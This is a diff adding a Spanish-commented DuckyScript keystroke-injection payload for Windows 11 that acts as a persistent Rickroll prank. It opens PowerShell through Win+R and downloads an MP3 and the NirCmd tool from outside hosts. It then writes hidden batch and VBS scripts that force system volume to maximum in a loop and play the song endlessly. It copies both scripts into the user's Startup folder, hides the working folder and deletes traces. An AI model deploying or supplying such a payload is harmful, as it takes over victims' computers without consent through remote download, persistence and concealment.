@@ -1,0 +1,23 @@
+REM --- Payload Definitivo sin limite de caracteres (Windows 11 / Layout ES) ---
+DELAY 1500
+
+REM --- 1. Abrir PowerShell desde Ejecutar (solo 10 caracteres, evita el limite de Win+R) ---
+GUI r
+DELAY 400
+STRING powershell
+ENTER
+DELAY 1500
+
+REM --- 2. Descargar y extraer los archivos necesarios (ejecucion dentro de la consola) ---
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $p="$env:USERPROFILE\Music\tmp"; md $p -ea 0; (New-Object Net.WebClient).DownloadFile('https://qoret.com/dl/uploads/2019/07/Rick_Astley_-_Never_Gonna_Give_You_Up_Qoret.com.mp3', "$p\rick.mp3"); (New-Object Net.WebClient).DownloadFile('http://www.nirsoft.net/utils/nircmd-x64.zip', "$p\n.zip"); Expand-Archive "$p\n.zip" $p -Force
+ENTER
+DELAY 6000
+
+REM --- 3. Configurar scripts de persistencia, volumen maximo y bucle ---
+STRING Set-Content "$p\volup.bat" ":loop`n`"$p\nircmd.exe`" mutesysvolume 0`n`"$p\nircmd.exe`" setsysvolume 65535`ntimeout /t 5`ngoto loop"; Set-Content "$p\volup.vbs" 'CreateObject("WScript.Shell").Run "' + $p + '\volup.bat",0,False'; Set-Content "$p\rickyou.vbs" 'While true`nDim oP: Set oP = CreateObject("WMPlayer.OCX")`noP.URL = "' + $p + '\rick.mp3"`noP.controls.play`nWhile oP.playState <> 1`nWScript.Sleep 100`nWend`noP.close`nWEnd'; $s="$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"; Copy "$p\rickyou.vbs" "$s\rickyou.vbs" -Force; Copy "$p\volup.vbs" "$s\volup.vbs" -Force; (Get-Item $p).attributes+=2; Remove-Item "$p\n.zip","$p\nircmdc.exe","$p\NirCmd.chm" -ea 0
+ENTER
+DELAY 1500
+
+REM --- 4. Cerrar la terminal de configuracion inicial ---
+STRING exit
+ENTER
